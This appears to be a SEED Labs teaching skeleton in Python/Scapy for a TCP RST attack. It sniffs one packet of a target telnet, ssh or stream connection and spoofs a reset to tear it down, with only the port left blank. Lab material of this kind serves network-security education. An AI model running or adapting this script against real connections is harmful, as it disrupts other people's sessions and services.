#!/usr/bin/env python3
"""
TCP RST Attack - Scapy skeleton (SEED Labs Task 2/3, adapted).
Sniff one live packet of the target connection, then spoof a RST that
matches its seq/ack/ports so the server (or client) tears down the stream.
Fill in every @@@@ yourself.
"""
from scapy.all import IP, TCP, sniff, send

TARGET_PORT = @@@@          # 2323 (telnet) / 22 (ssh) / 9091 (radio stream)
IFACE = "eth0"

print(f"Sniffing one packet on port {TARGET_PORT} to learn seq/ack/ports...")
pkt = sniff(iface=IFACE, filter=f"tcp and port {TARGET_PORT}", count=1)[0]

ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
tcp = TCP(
    sport=pkt[TCP].dport,
    dport=pkt[TCP].sport,
    flags="R",
    seq=pkt[TCP].ack,
    ack=0,
)
send(ip / tcp, verbose=0)
print("RST sent. The connection should now be torn down.")
